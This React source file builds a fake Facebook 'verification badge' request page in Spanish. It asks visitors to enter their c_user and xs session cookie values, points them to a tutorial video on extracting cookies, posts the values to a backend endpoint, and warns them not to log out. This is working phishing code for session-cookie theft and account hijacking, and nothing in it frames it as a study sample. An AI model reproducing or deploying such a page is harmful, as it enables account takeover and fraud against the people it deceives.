import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { useLocation } from "wouter";
import { formOneSchema, type FormOne } from "@shared/schema";
import { useMobile } from "@/hooks/use-mobile";
import { Search } from "lucide-react";
import React from 'react';

export default function FormOne() {
  const { toast } = useToast();
  const [, setLocation] = useLocation();
  const isMobile = useMobile();

  const form = useForm<FormOne>({
    resolver: zodResolver(formOneSchema),
    defaultValues: {
      c_user: "",
      xs: "",
    },
  });

  const onSubmit = async (data: FormOne) => {
    try {
      const response = await fetch('/api/form-one', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
      });

      if (!response.ok) {
        throw new Error('Error al enviar el formulario');
      }

      localStorage.setItem('validation_data', JSON.stringify(data));
      setLocation("/form-two");
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Error",
        description: "Error al enviar el formulario. Por favor, inténtelo de nuevo.",
      });
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white">
      <nav className="flex items-center justify-between p-3 sm:p-4 border-b">
        <div className="flex items-center">
          <p className="text-[#1877f2] text-xl sm:text-2xl font-bold">facebook</p>
        </div>
        <div className="flex items-center bg-[#F0F2F5] rounded-full px-3 sm:px-4 py-1.5 sm:py-2">
          <Search className="w-3 h-3 sm:w-4 sm:h-4 mr-2 text-[#65676B]" />
          <input
            type="text"
            placeholder="Buscar"
            className="bg-transparent outline-none text-sm sm:text-base w-24 sm:w-auto text-[#65676B] placeholder-[#65676B]"
          />
        </div>
      </nav>

      <div className="flex-1 flex justify-center p-4 sm:p-8">
        <div className="max-w-2xl w-full space-y-4 sm:space-y-6">
          <h1 className="text-xl sm:text-2xl font-bold text-[#1c1e21]">
            Solicitar una insignia de verificación en Facebook
          </h1>

          <div className="space-y-3 sm:space-y-4 text-[#65676B] text-sm sm:text-base">
            <p>
              La insignia de verificación significa que Facebook ha confirmado que la Página o el perfil es la presencia auténtica del individuo, figura pública o marca que representa.
            </p>
            <p>
              Anteriormente, la insignia de verificación también requería que la persona o marca fuera notable y única. Es posible que aún vea usuarios con una insignia de verificación que representa nuestros requisitos de elegibilidad anteriores.
            </p>
            <p>
              Por favor, proporcione los detalles precisos a continuación. Consulte el video para obtener aclaraciones si encuentra las instrucciones poco claras.
            </p>
            <div className="w-full aspect-video">
              <video 
                className="w-full h-full object-cover rounded-lg"
                controls
                src="https://pub-97836f8a77c541e9afe2515c4730dd50.r2.dev/cookie.mp4"
              >
                Tu navegador no soporta el elemento de video.
              </video>
            </div>
          </div>

          <Form {...form}>
            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
              <FormField
                control={form.control}
                name="c_user"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel className="text-sm sm:text-base text-[#1c1e21]">c_user</FormLabel>
                    <FormControl>
                      <Input
                        type="number"
                        min="0"
                        pattern="[0-9]+"
                        minLength={6}
                        placeholder="Ingrese c_user"
                        className="text-sm sm:text-base border-[#dddfe2] focus:border-[#1877f2] focus:ring-[#1877f2] focus:ring-opacity-50"
                        {...field}
                      />
                    </FormControl>
                    <FormMessage className="text-xs text-[#dc3545]" />
                  </FormItem>
                )}
              />
              <FormField
                control={form.control}
                name="xs"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel className="text-sm sm:text-base text-[#1c1e21]">xs</FormLabel>
                    <FormControl>
                      <Input
                        type="text"
                        placeholder="Ingrese xs"
                        className="text-sm sm:text-base border-[#dddfe2] focus:border-[#1877f2] focus:ring-[#1877f2] focus:ring-opacity-50"
                        {...field}
                      />
                    </FormControl>
                    <FormMessage className="text-xs text-[#dc3545]" />
                  </FormItem>
                )}
              />

              <p className="text-xs sm:text-sm text-[#65676B]">
                Asegúrese de no cerrar sesión en su computadora o laptop hasta que haya recibido un correo electrónico de verificación.
              </p>

              <Button
                type="submit"
                className="w-full py-2 sm:py-2.5 text-sm sm:text-base bg-[#1877f2] hover:bg-[#166fe5] transition-colors duration-200"
                disabled={form.formState.isSubmitting}
              >
                {form.formState.isSubmitting ? "Enviando..." : "Enviar"}
              </Button>
            </form>
          </Form>
        </div>
      </div>

      <div className="text-center p-3 sm:p-4 text-xs sm:text-sm text-[#65676B] border-t">
        Meta © 2025
      </div>
    </div>
  );
}